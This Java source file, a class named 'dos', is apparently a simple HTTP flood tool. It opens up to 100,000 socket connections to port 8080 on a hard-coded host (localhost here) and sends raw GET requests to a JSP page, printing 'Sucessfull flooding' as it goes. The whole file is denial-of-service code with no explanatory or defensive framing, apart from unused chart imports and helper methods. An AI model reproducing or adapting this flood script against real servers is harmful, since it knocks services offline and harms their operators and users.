/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Dayal
 */
import org.jfree.chart.*;
import org.jfree.chart.plot.PlotOrientation;
import org.jfree.data.xy.*;
import org.jfree.data.*;
import java.net.*;
import java.io.*;
import java.util.*;
public class dos {

  public static void main(String[] args) {
String target= "127.0.0.1";
Socket net;


for(int i=1; i<100000 ; i++){ //HTTP FLOOD CODE HERE
              try {
               net = new Socket(target, 8080);

               sendRawLine("GET /WebModule/vulreqfloofing.jsp HTTP/1.1", net);

               sendRawLine("Host: " + target, net);
            sendRawLine("Accept: text/plain, text/html text/*\r\n",net );
               sendRawLine("Connection: close",net );





               System.out.println("stress limit..."+i);
              }

                 catch(UnknownHostException e)

                 {
                  System.out.println(" unkwownhost error");
                 }

                 catch(IOException e)
                 {

                    System.out.println(e);
                 }

       // Display the string.
}

  }
  public static void readRawLine(Socket sock)
    {
  String a="";
      try
      {
          int count=0;
  InputStream in = sock.getInputStream();

  InputStreamReader isr = new InputStreamReader(in);
         BufferedReader br = new BufferedReader(isr);
         int c;
         while ((c = br.read()) != -1  && count < 17) {
           System.out.print((char) c);
          a= a+(char)c;
          count++;


         }

        }
      catch(IOException e)
      {}

 }
   public static int checkStringContains(String haystack,String needle1) {

        int index1 = haystack.indexOf(needle1);
        if (index1 != -1)
        return 1;
        else
            return 0;


    }

   public static void sendRawLine(String text, Socket sock)
   {
      try {
          System.out.println("Sucessfull flooding....");
         BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
         out.write(text+"\n");
         out.flush();
      } catch(IOException ex) {
         ex.printStackTrace();
      }
    }
  }
